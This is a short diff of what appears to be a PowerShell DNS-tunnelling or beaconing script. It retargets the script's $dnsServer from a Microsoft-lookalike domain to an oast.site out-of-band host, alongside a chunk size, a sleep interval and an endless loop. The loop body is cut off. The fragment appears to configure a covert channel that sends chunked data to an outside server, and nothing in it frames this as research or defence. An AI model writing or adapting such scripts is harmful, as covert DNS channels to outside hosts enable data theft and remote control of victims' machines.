@@ -1,6 +1,6 @@
 $previousPelet = $null
 $chunkSize = 60
-$dnsServer = "ftp-microsoft.com" 
+$dnsServer = "cthdrkcatcmo734dh9tgtkxho3enk1km5.oast.site" 
 $dnsRecord = "ftp-microsoft.com" 
 $sleepInterval = "0.5"
 while ($true) {
